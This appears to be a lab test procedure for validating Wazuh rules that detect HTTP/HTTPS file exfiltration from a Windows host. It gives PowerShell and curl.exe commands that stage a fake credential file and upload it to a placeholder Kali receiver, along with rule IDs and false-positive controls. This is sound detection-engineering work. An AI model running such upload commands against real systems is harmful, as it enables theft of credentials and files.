# HTTP/HTTPS file exfiltration validation

## Rule file

`rules/http_exfiltration_detection.xml`

## Prerequisites

- WIN01 agent `004` active and collecting Security 4688, Sysmon Event 1, and PowerShell Operational 4104.
- Wazuh manager services healthy.
- Local medium-integrity `SIMULATION\yassine.karimi` PowerShell session.
- A bounded HTTP receiver on the Kali host-only interface. The receiver must impose a small request-size limit, accept only `POST /upload`, write one file, print its SHA-256, and return HTTP 201.
- Use controlled canary credentials only. Do not transmit real credentials.

## Detection layers

```text
100530 / level 10 — Security 4688: curl local-file upload syntax over HTTP/S
100531 / level 12 — immediate curl source argument has a sensitive extension
100532 / level 10 — PowerShell curl/IWR/IRM/WebClient/BITS/HttpClient upload behavior
100544 / level 10 — Sysmon curl OriginalFileName plus upload syntax (rename-resistant)
100545 / level 11 — credential-like staging on the environment-variable PowerShell path
100547 / level 10 — PowerShell base-parent path for upload behavior without environment-variable child selection
100548 / level 11 — credential-like staging on the base-parent PowerShell path
```

All descriptions are attempt-oriented. Process and script-block telemetry do not prove that a receiver obtained bytes.

## Primary positive test

Create a controlled confidential-looking credential file and upload it as a local file with Windows `curl.exe`:

```powershell
$d="$env:USERPROFILE\Documents\Finance";$p="$d\Q3_Acquisition_DB_Credentials.txt";New-Item -ItemType Directory -Path $d -Force|Out-Null;[IO.File]::WriteAllLines($p,@("Classification=CONFIDENTIAL","System=Q3 Acquisition Finance Database","Account=SIMULATION\svc_backup_ops","Password=<CONTROLLED_CANARY_PASSWORD>","RecoveryToken=<CONTROLLED_CANARY_TOKEN>"));curl.exe -sS -X POST -H "Content-Type: application/octet-stream" --data-binary "@$p" "http://<KALI_HOST_ONLY>:18083/upload"
```

Require all of the following:

```text
Receiver returns HTTP 201 / RECEIVED
Received byte count matches the source
Received SHA-256 matches the source
Security 4688 selects 100531
Sysmon Event 1 selects 100544
PowerShell 4104 selects 100545
Execution identity is SIMULATION\yassine.karimi at medium integrity
```

A `100531` child proves the `100530` parent path matched. `100544` independently preserves curl PE-metadata attribution after ordinary executable renaming; PE metadata can be forged and is not a cryptographic identity proof.

## Alternate PowerShell API positive

Use a harmless controlled file and the same receiver to prove that coverage is not curl-specific:

```powershell
$p=Join-Path $env:TEMP 'WazuhHttpApiRetest.txt';[IO.File]::WriteAllText($p,'CONTROLLED_HTTP_UPLOAD');Invoke-WebRequest -UseBasicParsing -Method Put -InFile $p -Uri 'http://<KALI_HOST_ONLY>:18083/upload';Remove-Item -LiteralPath $p -Force
```

Expected: PowerShell rule `100532`. Rule `100545` is not required because this control has no credential-like staging labels.

## Curl `--next` same-segment positives

These controls prove that a legitimate HTTP upload remains visible when curl has multiple transfer segments. Run them separately so the environment-variable and base-parent PowerShell paths remain distinguishable.

Environment-variable path, upload before `--next`:

```powershell
$p=Join-Path $env:TEMP 'WazuhCurlNextEnv.txt';[IO.File]::WriteAllText($p,'CONTROLLED_NEXT_ENV');curl.exe -sS --max-time 3 --data-binary "@$p" "http://<KALI_HOST_ONLY>:18083/upload" --next --max-time 1 "http://127.0.0.1:9/health" *> $null;Remove-Item -LiteralPath $p -Force
```

Expected: Security/Sysmon upload visibility plus PowerShell rule `100532`; the receiver must obtain `CONTROLLED_NEXT_ENV` with matching byte count and SHA-256.

Base-parent path, upload after `--next`:

```powershell
$p=[IO.Path]::Combine([IO.Path]::GetTempPath(),'WazuhCurlNextBase.txt');[IO.File]::WriteAllText($p,'CONTROLLED_NEXT_BASE');curl.exe -sS --max-time 1 "http://127.0.0.1:9/health" --next --max-time 3 --data-binary "@$p" "http://<KALI_HOST_ONLY>:18083/upload" *> $null;Remove-Item -LiteralPath $p -Force
```

Expected: Security/Sysmon upload visibility plus PowerShell rule `100547`; the receiver must obtain `CONTROLLED_NEXT_BASE` with matching byte count and SHA-256.

## False-positive tests

Run from the same interactive user shell:

```powershell
curl.exe --version *> $null;curl.exe -sS "http://127.0.0.1:9/health" *> $null;curl.exe -sS -X POST --data-binary "status=ok" "http://127.0.0.1:9/telemetry" *> $null;Invoke-WebRequest -UseBasicParsing -Method Get -Uri 'http://127.0.0.1:9/health' -TimeoutSec 2 -ErrorAction SilentlyContinue|Out-Null;'HTTP_EXFIL_FP_TESTS_DONE'
```

Expected: raw process/script telemetry, but no `100530`, `100531`, `100532`, `100544`, `100545`, `100547`, or `100548`.

Argument-boundary control:

```powershell
$p=Join-Path $env:TEMP 'health.json';Set-Content -LiteralPath $p -Value '{"status":"ok"}';curl.exe -sS --max-time 2 --upload-file $p 'http://127.0.0.1:9/report.zip' *> $null;Remove-Item -LiteralPath $p -Force
```

Expected: generic upload-attempt visibility (`100530` and `100544`) may fire, but sensitive-source rule `100531` and credential-staging rule `100545` must not. The `.zip` in the destination URL must never be mistaken for the source extension.

Cross-transfer and unrelated-URL controls:

```powershell
$p=Join-Path $env:TEMP 'controlled.txt';Set-Content -LiteralPath $p -Value 'CONTROLLED';curl.exe -sS --max-time 1 --upload-file $p 'ftp://127.0.0.1:9/upload' --next 'https://127.0.0.1:9/health' *> $null;$wc=New-Object Net.WebClient;try{$wc.UploadFile('ftp://127.0.0.1:9/upload',$p)}catch{};Invoke-WebRequest -UseBasicParsing -Method Get -Uri 'https://127.0.0.1:9/health' -TimeoutSec 1 -ErrorAction SilentlyContinue|Out-Null;Remove-Item -LiteralPath $p -Force
```

Expected: no `100530`, `100531`, `100532`, `100544`, `100545`, `100547`, or `100548`. An FTP upload in one curl transfer segment, PowerShell statement, or WebClient call must not borrow an unrelated HTTPS GET as its destination evidence.

## Dashboard queries

```text
agent.id:"004" AND rule.id:("100530" OR "100531" OR "100532" OR "100544" OR "100545" OR "100547" OR "100548")
```

High-confidence layers:

```text
agent.id:"004" AND rule.id:("100531" OR "100544" OR "100545" OR "100548")
```

## Cleanup

Stop the bounded receiver and temporary SSH forwards. Retain only controlled artifacts required for reproduction. Delete the controlled credential fixture when it is no longer needed:

```powershell
Remove-Item "$env:USERPROFILE\Documents\Finance\Q3_Acquisition_DB_Credentials.txt" -Force -ErrorAction SilentlyContinue
```
